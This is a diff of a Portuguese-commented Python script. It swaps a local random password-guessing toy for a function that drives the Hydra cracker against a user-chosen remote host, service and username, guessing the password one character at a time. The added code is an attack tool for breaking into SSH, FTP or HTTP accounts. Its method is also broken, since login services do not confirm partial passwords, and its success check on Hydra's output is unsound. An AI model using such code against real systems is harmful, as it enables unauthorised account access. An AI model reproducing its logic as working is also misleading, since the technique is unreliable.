@@ -1,50 +1,51 @@
-import threading
-from random import choice
-import os
+import subprocess
+import string
 
-os.system("clear")
-b = input('Digite sua senha: ')
+def hydra_brute_force_character_by_character(target, service, username, max_length):
+    """
+    Realiza ataque de força bruta com o Hydra, caractere por caractere, até descobrir a senha completa.
+    
+    :param target: Endereço do alvo (IP ou domínio).
+    :param service: Serviço a ser testado (ex.: ssh, ftp, http).
+    :param username: Nome de usuário para autenticação.
+    :param max_length: Comprimento máximo da senha.
+    """
+    charset = string.ascii_letters + string.digits + string.punctuation
+    discovered_password = ""
 
+    print(f"Iniciando força bruta caractere por caractere contra {service}://{target} com o usuário '{username}'...")
 
-pwd = [
-  'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 
-  '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', 
-  '!', '@', '#', '$', '%', '&', '*', '(', ')', '-', '_', '=', '+', '[', ']', '{', '}', ';', ':', ',', '.', '/', '?', '|', '\\'
-]
+    for position in range(1, max_length + 1):
+        for char in charset:
+            attempt = discovered_password + char
+            print(f"Tentando: {attempt}")
 
-found = False  
+            # Executa o Hydra com a tentativa atual
+            command = [
+                "hydra", "-l", username, "-p", attempt, target, service
+            ]
+            process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            stdout, stderr = process.communicate()
 
+            # Verifica se a saída do Hydra indica sucesso
+            if b"login:" in stdout and b"password:" in stdout:
+                discovered_password += char
+                print(f"Caractere encontrado: {char} | Senha até agora: {discovered_password}")
+                break
 
-def brute_force(thread_id):
-    global found
-    while not found:
-        pw = ""
-        for _ in range(len(b)):  # Gera tentativa do mesmo tamanho da senha
-            pw += choice(pwd)  # Escolhe um caractere aleatório
-        print(f"Thread-{thread_id} tentando: {pw}")
-        
-        if pw == b:
-            found = True
-            print(f"\nSenha encontrada pela Thread-{thread_id}: {pw}")
-            os._exit(0)  # Encerra o programa imediatamente
+        # Verifica se a senha completa foi encontrada
+        if len(discovered_password) == position:
+            continue
+        else:
+            print("Senha completa descoberta ou erro no serviço.")
+            break
 
+    print(f"\nSenha descoberta: {discovered_password}")
 
-try:
-    num_threads = int(input("Quantas threads você deseja usar?(nao recomendavel menores que 10 e maiores que 50)"))
-    if num_threads <= 0:
-        raise ValueError("O número de threads deve ser maior que zero.")
-except ValueError as e:
-    print(f"Entrada inválida: {e}. Usando 1 thread como padrão.")
-    num_threads = 1
+# Configuração de teste
+target = input("Digite o endereço do alvo (IP ou domínio): ")
+service = input("Digite o serviço (ex.: ssh, ftp, http): ")
+username = input("Digite o nome de usuário: ")
+max_length = int(input("Digite o comprimento máximo da senha: "))
 
-
-threads = []
-
-for i in range(num_threads):
-    t = threading.Thread(target=brute_force, args=(i,))
-    threads.append(t)
-    t.start()
-
-for t in threads:
-    t.join()
-
+hydra_brute_force_character_by_character(target, service, username, max_length)
